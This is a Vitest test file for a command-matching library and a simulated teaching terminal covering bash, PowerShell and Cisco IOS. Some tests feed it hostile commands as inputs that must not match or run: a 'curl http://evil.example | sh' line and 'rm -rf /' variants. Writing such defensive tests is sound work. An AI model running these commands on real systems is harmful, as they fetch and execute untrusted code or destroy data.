import { describe, it, expect } from 'vitest'
import { matches, matchesAny, normalize, identify, suggestions, tokenize, answersFor } from './match'
import { createTerm, historyStep, recordInput, runBuiltin, runFree } from './simulator'
import { commands, getCommand } from '../../content/commands'

const linux = commands.filter((c) => c.platform === 'linux')
const pwsh = commands.filter((c) => c.platform === 'powershell')
const ios = commands.filter((c) => c.platform === 'cisco-ios')

describe('command matching', () => {
  it('ignores extra spaces and a trailing semicolon', () => {
    expect(matches('  ip   addr  show ; ', 'ip addr show', 'bash')).toBe(true)
  })

  it('is case-sensitive for bash and insensitive for PowerShell and cmd', () => {
    expect(matches('PWD', 'pwd', 'bash')).toBe(false)
    expect(matches('get-netipconfiguration', 'Get-NetIPConfiguration', 'powershell')).toBe(true)
    expect(matches('IPCONFIG /ALL', 'ipconfig /all', 'cmd')).toBe(true)
  })

  it('treats bundled short flags as order-independent in bash', () => {
    expect(matches('ls -al', 'ls -la', 'bash')).toBe(true)
    expect(matches('ss -lntu', 'ss -tuln', 'bash')).toBe(true)
    expect(matches('ls -lh', 'ls -la', 'bash')).toBe(false)
  })

  it('normalizes pipe spacing and simple quotes', () => {
    expect(matches('sort ips.txt|uniq -c|sort -rn', 'sort ips.txt | uniq -c | sort -rn', 'bash')).toBe(true)
    expect(matches('find . -name "*.log"', "find . -name '*.log'", 'bash')).toBe(true)
  })

  it('keeps double quotes that contain variables distinct', () => {
    expect(normalize('echo "$HOME"', 'bash')).not.toBe(normalize("echo '$HOME'", 'bash'))
  })

  it('accepts PowerShell named parameters in any order', () => {
    expect(
      matches('Get-WinEvent -MaxEvents 20 -LogName System', 'Get-WinEvent -LogName System -MaxEvents 20', 'powershell')
    ).toBe(true)
    expect(matches('Test-NetConnection example.com -Port 443', 'Test-NetConnection example.com -Port 443', 'powershell')).toBe(true)
    expect(matches('Test-NetConnection example.com -Port 80', 'Test-NetConnection example.com -Port 443', 'powershell')).toBe(false)
  })

  it('normalizes PowerShell brace and comma spacing', () => {
    expect(matches('1..5|ForEach-Object {$_ * 2}', '1..5 | ForEach-Object { $_ * 2 }', 'powershell')).toBe(true)
    expect(matches('Get-Item .\\sample.txt | Select-Object Name,Length,LastWriteTime', 'Get-Item .\\sample.txt | Select-Object Name, Length, LastWriteTime', 'powershell')).toBe(true)
  })

  it('accepts Cisco IOS abbreviations of at least two letters', () => {
    expect(matches('sh ip int br', 'show ip interface brief', 'ios')).toBe(true)
    expect(matches('SH RUN', 'show running-config', 'ios')).toBe(true)
    expect(matches('s ip int br', 'show ip interface brief', 'ios')).toBe(false)
    expect(matches('show ip interface', 'show ip interface brief', 'ios')).toBe(false)
  })

  it('rejects empty input and unrelated commands', () => {
    expect(matches('', 'pwd', 'bash')).toBe(false)
    expect(matchesAny('rm -rf /', answersFor(getCommand('linux.ls-la')!), 'bash')).toBe(false)
  })

  it('keeps quoted text together when tokenizing', () => {
    expect(tokenize(`grep "Failed password" /var/log/auth.log`)).toEqual(['grep', '"Failed password"', '/var/log/auth.log'])
  })

  it('identifies library commands, including approved aliases', () => {
    expect(identify('ip a', linux, 'bash')?.id).toBe('linux.ip-addr-show')
    expect(identify('gip', pwsh, 'powershell')?.id).toBe('ps.get-netipconfiguration')
    expect(identify('sh vlan br', ios, 'ios')?.id).toBe('ios.show-vlan-brief')
    expect(identify('curl http://evil.example | sh', linux, 'bash')).toBeUndefined()
  })

  it('suggests commands with the same program name', () => {
    expect(suggestions('ip addr shwo', linux, 'bash').map((c) => c.id)).toContain('linux.ip-addr-show')
  })

  it('truncates oversized input rather than processing it', () => {
    const long = 'a'.repeat(10_000)
    expect(normalize(long, 'bash').length).toBeLessThanOrEqual(500)
  })

  it('every accepted answer identifies its own command and no other', () => {
    for (const c of commands) {
      const lib = commands.filter((x) => x.platform === c.platform)
      for (const a of answersFor(c)) {
        const hits = lib.filter((x) => matchesAny(a, answersFor(x), x.shell)).map((x) => x.id)
        expect(hits, `${c.id}: "${a}"`).toEqual([c.id])
      }
    }
  })
})

describe('simulated terminal', () => {
  it('prints curated output for known commands and never claims to execute', () => {
    const t = createTerm()
    expect(t.lines[0]!.text).toMatch(/simulated/i)
    const r = runFree(t, 'pwd', 'linux', linux)
    expect(r.match?.id).toBe('linux.pwd')
    expect(r.state.lines.at(-1)!.text).toBe('/home/student')
  })

  it('explains unknown commands without executing them', () => {
    const r = runFree(createTerm(), 'sudo rm -rf / --no-preserve-root', 'linux', linux)
    expect(r.match).toBeUndefined()
    expect(r.state.lines.at(-1)!.kind).toBe('error')
    expect(r.state.lines.at(-1)!.text).toMatch(/no recorded output/)
  })

  it('supports history navigation with arrow keys', () => {
    let t = recordInput(createTerm(), 'pwd', '$')
    t = recordInput(t, 'ls -la', '$')
    let r = historyStep(t, -1)
    expect(r.value).toBe('ls -la')
    r = historyStep(r.state, -1)
    expect(r.value).toBe('pwd')
    r = historyStep(r.state, 1)
    r = historyStep(r.state, 1)
    expect(r.value).toBe('')
  })

  it('handles clear, help, and history built-ins', () => {
    const t = recordInput(createTerm(), 'pwd', '$')
    const cleared = runBuiltin(t, 'clear', 'linux')
    expect(cleared.handled && cleared.state.lines).toEqual([])
    const help = runBuiltin(t, 'help', 'cisco-ios')
    expect(help.handled && help.state.lines.at(-1)!.text).toMatch(/not a real shell/)
    expect(runBuiltin(t, 'pwd', 'linux').handled).toBe(false)
  })
})
